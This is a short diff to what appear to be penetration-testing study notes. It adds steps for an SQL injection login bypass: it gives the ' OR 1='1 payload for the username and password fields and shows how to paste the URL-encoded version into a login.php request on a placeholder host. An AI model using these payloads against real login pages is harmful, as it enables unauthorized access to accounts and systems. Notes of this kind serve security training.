@@ -248,6 +248,8 @@ DAY 3
 SQL AUTHENTICATION BYPASS (AFTER HTTP ENUMERATION)
 user: 'OR 1='1
 pass: 'OR 1='1
+AFTER LOGIN
 Go to inspect > Network > Post > Request > Raw (radio button)
 #at the end of URL, type '? and content from Raw button
-x.x.x.x/login.php?username='OR 1='1&password=OR 1='1
+x.x.x.x/login.php?<content from raw button>
+username=%27OR+1%3D%271&passwd=%27OR+1%3D%271 (WHAT YOU PASTE SHOULD LOOK LIKE THIS)
